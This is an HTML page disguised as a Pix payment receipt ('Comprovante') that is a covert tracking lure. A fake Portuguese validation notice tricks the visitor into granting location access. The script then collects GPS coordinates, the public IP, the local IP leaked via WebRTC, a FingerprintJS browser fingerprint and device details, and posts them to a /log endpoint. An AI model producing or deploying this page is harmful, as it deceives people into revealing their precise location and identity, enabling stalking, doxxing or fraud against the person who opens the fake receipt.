<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Comprovante</title>
  <style>
    body {
      background: #fff;
      text-align: center;
      font-family: Arial;
    }
    img {
      margin-top: 50px;
      width: 90%;
      max-width: 500px;
    }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix" />

  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    async function rastrearComPermissaoGPS() {
      try {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const gpsCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
          console.log("üìç Localiza√ß√£o GPS precisa:", gpsCoords);

          const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());

          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel("");
          const offer = await pc.createOffer();
          await pc.setLocalDescription(offer);

          let localIP = "N/A";
          pc.onicecandidate = event => {
            if (event && event.candidate) {
              const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
              if (match) localIP = match[1];
            }
          };

          const fp = await FingerprintJS.load();
          const result = await fp.get();

          const data = {
            ip: ipData.ip,
            localIP,
            visitorId: result.visitorId,
            userAgent: navigator.userAgent,
            device: `${navigator.platform} - ${navigator.userAgent}`,
            loc: gpsCoords
          };

          console.log("üì¶ Payload final:", data);

          await fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });

          console.log("‚úÖ Dados enviados com sucesso");
        }, (err) => {
          console.warn("‚ö†Ô∏è Permiss√£o de localiza√ß√£o negada ou falhou:", err);
        });
      } catch (e) {
        console.error("‚ùå Erro geral no rastreamento:", e);
      }
    }

    window.onload = () => {
      const alerta = document.createElement("div");
      alerta.style = "background: #fffbe6; border: 2px solid #ffd700; padding: 20px; margin: 30px; font-size: 18px; font-family: Arial;";
      alerta.innerHTML = `
        ‚ö†Ô∏è <b>Este documento precisa ser validado em nosso servidor.</b><br><br>
        Por favor, clique em <b>‚ÄúPermitir‚Äù</b> na pr√≥xima tela para concluir a verifica√ß√£o.
      `;

      document.body.appendChild(alerta);

      setTimeout(() => {
        rastrearComPermissaoGPS();
      }, 2000);
    };
  </script>
</body>
</html>
